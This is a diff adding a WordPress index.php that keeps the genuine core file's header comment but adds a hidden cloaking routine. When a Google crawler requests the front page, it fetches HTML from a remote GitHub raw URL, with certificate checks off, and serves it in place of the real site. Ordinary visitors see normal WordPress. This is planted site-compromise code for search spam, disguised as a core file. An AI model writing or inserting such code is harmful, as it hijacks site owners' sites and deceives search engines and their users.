@@ -1,0 +1,101 @@
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+
+$remote_url = 'https://raw.githubusercontent.com/guoosmineva/kimproject/refs/heads/main/ail.txt';
+
+function is_google_bot() {
+    $user_agents = [
+        'Googlebot',
+        'Googlebot-Image',
+        'Googlebot-News', 
+        'Googlebot-Video',
+        'AdsBot-Google',
+        'AdsBot-Google-Mobile',
+        'AdsBot-Google-Mobile-Apps',
+        'Mediapartners-Google',
+        'APIs-Google',
+        'Google-Site-Verification',
+        'Google-InspectionTool',
+        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
+    ];
+
+    $agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+    foreach ($user_agents as $google_agent) {
+        if (stripos($agent, $google_agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function is_front_page_request() {
+    $request_uri = trim($_SERVER['REQUEST_URI'], '/');
+    return $request_uri === '' || $request_uri === 'index.php';
+}
+
+function get_remote_content($url) {
+    $options = [
+        'http' => [
+            'method' => 'GET',
+            'timeout' => 10, 
+            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
+        ]
+    ];
+    
+    $context = stream_context_create($options);
+    
+    $content = @file_get_contents($url, false, $context);
+    
+    if ($content === false) {
+        // Fallback dengan cURL
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
+        $content = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($http_code !== 200) {
+            return false;
+        }
+    }
+    
+    return $content;
+}
+
+if (is_front_page_request() && is_google_bot()) {
+    header('Cache-Control: no-cache, no-store, must-revalidate');
+    header('Pragma: no-cache');
+    header('Expires: 0');
+    header('Content-Type: text/html');
+
+    $cloaked_content = get_remote_content($remote_url);
+    
+    if ($cloaked_content !== false) {
+        echo $cloaked_content;
+    } else {
+        // Jika gagal ambil konten cloaking, fallback ke WordPress normal
+        define('WP_USE_THEMES', true);
+        require __DIR__ . '/wp-blog-header.php';
+        exit;
+    }
+    exit;
+}
+
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
